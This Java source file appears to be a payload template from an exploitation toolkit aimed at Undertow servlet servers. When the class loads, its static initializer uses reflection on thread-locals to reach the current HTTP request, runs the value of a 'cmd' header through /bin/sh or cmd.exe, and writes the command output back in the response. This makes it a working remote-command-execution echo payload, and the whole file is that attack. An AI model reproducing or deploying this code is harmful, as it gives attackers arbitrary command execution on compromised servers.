package jeg.core.template.undertow;

import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Scanner;

public class UndertowCmdExecTpl {
    static {
        new UndertowCmdExecTpl();
    }

    private String getReqHeaderName() {
        return "cmd";
    }


    public UndertowCmdExecTpl(){
        run();
    }

    private void run(){
        try {
            Thread thread = Thread.currentThread();
            Object threadLocals = getFV(thread,"threadLocals");
            Object table = getFV(threadLocals,"table");

            for (int i = 0; i < Array.getLength(table); i++) {
                Object entry = Array.get(table, i);
                if (entry == null) continue;
                Object value = getFV(entry,"value");
                if (value != null && value.getClass().getName().contains("ServletRequestContext")) {
                    Object request = getFV(value,"servletRequest");
                    String cmd = (String) invokeMethod(request,"getHeader",new Class[]{String.class},new Object[]{getReqHeaderName()});
                    Object response = getFV(value,"servletResponse");
                    PrintWriter writer = (PrintWriter) invokeMethod(response,"getWriter",new Class[0],new Object[0]);
                    writer.write(exec(cmd));
                    writer.flush();
                    writer.close();
                }
            }
        }catch (Exception e){ }
    }

    private String exec(String cmd) {
        try {
            boolean isLinux = true;
            String osType = System.getProperty("os.name");
            if (osType != null && osType.toLowerCase().contains("win")) {
                isLinux = false;
            }

            String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String execRes = "";
            while (s.hasNext()) {
                execRes += s.next();
            }
            return execRes;
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    private synchronized Object getFV(final Object o, final String s) throws Exception {
        Field declaredField = null;
        Class<?> clazz = o.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(s);
                break;
            }
            catch (NoSuchFieldException ex) {
                clazz = clazz.getSuperclass();
            }
        }
        if (declaredField == null) {
            throw new NoSuchFieldException(s);
        }
        declaredField.setAccessible(true);
        return declaredField.get(o);
    }


    private synchronized Object invokeMethod(final Object obj,final String methodName,Class[] paramClazz,Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Method method = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class){
            try {
                method = clazz.getDeclaredMethod(methodName,paramClazz);
                break;
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj,param);
    }

}
